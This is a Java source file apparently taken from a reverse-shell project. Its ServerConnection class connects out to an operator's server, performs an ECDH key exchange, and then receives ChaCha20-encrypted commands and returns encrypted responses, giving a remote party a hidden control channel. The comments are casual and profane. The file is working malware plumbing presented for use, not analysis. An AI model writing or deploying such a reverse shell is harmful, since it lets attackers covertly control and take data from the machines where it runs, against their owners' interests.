package obs1d1anc1ph3r.reverseshell;

import obs1d1anc1ph3r.reverseshell.encryption.ECDHKeyExchange;
import obs1d1anc1ph3r.reverseshell.encryption.ChaCha20;

import java.io.*;
import java.net.*;
import java.security.SecureRandom;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ServerConnection {

	private final String serverIp;
	private final int serverPort;
	private Socket socket;
	private DataInputStream dataIn;
	private DataOutputStream dataOut;
	private byte[] encryptionKey;
	private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());

	private final byte[] privateKey;
	private final byte[] publicKey;

	/*This class does way too much fucking stuff
	ToDo - refactor this shit */
	public ServerConnection(String serverIp, int serverPort) {
		this.serverIp = serverIp;
		this.serverPort = serverPort;

		//Get the keys for the handshake
		this.privateKey = ECDHKeyExchange.generatePrivateKey();
		this.publicKey = ECDHKeyExchange.generatePublicKey(privateKey);
	}

	public synchronized void connect() throws IOException {
		try {
			System.out.println("[-] Connecting to server...");
			socket = new Socket();
			socket.connect(new InetSocketAddress(serverIp, serverPort), 5000); //I think this is a timeout thing, I forgot tbh
			System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);
			dataIn = new DataInputStream(socket.getInputStream());
			dataOut = new DataOutputStream(socket.getOutputStream());
			
			//Send the public key
			sendPublicKey();
			byte[] serverPublicKey = receivePublicKey();

			if (serverPublicKey == null || serverPublicKey.length == 0) {
				throw new IOException("Invalid or empty public key received.");
			}

			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(privateKey, serverPublicKey); //Do the handshake

			System.out.println("[-*] Encryption key established.");
		} catch (UnknownHostException e) {
			logger.log(Level.SEVERE, "Unknown host: {0}", e.getMessage());
			cleanup();
			throw new IOException("Unknown host: " + e.getMessage(), e);
		} catch (IOException e) {
			logger.log(Level.SEVERE, "IO error occurred while connecting: {0}", e.getMessage());
			cleanup();
			throw e;
		}
	}

	//Prove yourself worthy
	private void sendPublicKey() throws IOException {
		dataOut.writeInt(publicKey.length);
		dataOut.write(publicKey);
		dataOut.flush();
	}

	//Okay...but are you worthy?
	private byte[] receivePublicKey() throws IOException {
		int length = dataIn.readInt();
		if (length <= 0 || length > 256) {
			throw new IOException("Invalid public key length received.");
		}
		byte[] publicKeyServer = new byte[length];
		dataIn.readFully(publicKeyServer);
		return publicKeyServer;
	}
	
	//I'm illiterate, so I make computers read for me
	public String readCommand() throws IOException {
		int length = dataIn.readInt();
		if (length <= 12) {
			throw new IOException("Invalid encrypted command length.");
		}

		byte[] nonce = new byte[12];
		byte[] encryptedCommand = new byte[length - 12];

		dataIn.readFully(nonce);
		dataIn.readFully(encryptedCommand);

		try {
			byte[] decryptedCommand = ChaCha20.decrypt(encryptionKey, nonce, encryptedCommand);
			return ChaCha20.bytesToString(decryptedCommand);
		} catch (Exception e) {
			throw new IOException("Failed to decrypt command", e);
		}
	}
	
	//I have social anxiety, so I make computers respond for me
	public void sendEncryptedResponse(String response) throws IOException, Exception {
		byte[] nonce = new byte[12];
		new SecureRandom().nextBytes(nonce);

		byte[] encryptedResponse = ChaCha20.encrypt(encryptionKey, nonce, ChaCha20.stringToBytes(response));

		dataOut.writeInt(nonce.length + encryptedResponse.length);
		dataOut.write(nonce);
		dataOut.write(encryptedResponse);
		dataOut.flush();
	}
	
	//Pass it on
	public DataOutputStream getDataOut() {
		return dataOut;
	}
	
	//Pass it on
	public byte[] getSessionKey() {
		return encryptionKey;
	}

	//I think this works, if it doesn't, then if it stops with errors, it's still stopped, so win win, I guess
	public synchronized void cleanup() {
		try {
			if (dataIn != null) {
				dataIn.close();
			}
			if (dataOut != null) {
				dataOut.close();
			}
			if (socket != null) {
				socket.close();
			}
			System.out.println("[*] Resources cleaned up successfully.");
		} catch (IOException e) {
			logger.log(Level.SEVERE, "Error closing resources: " + e.getMessage(), e);
		}
	}
}
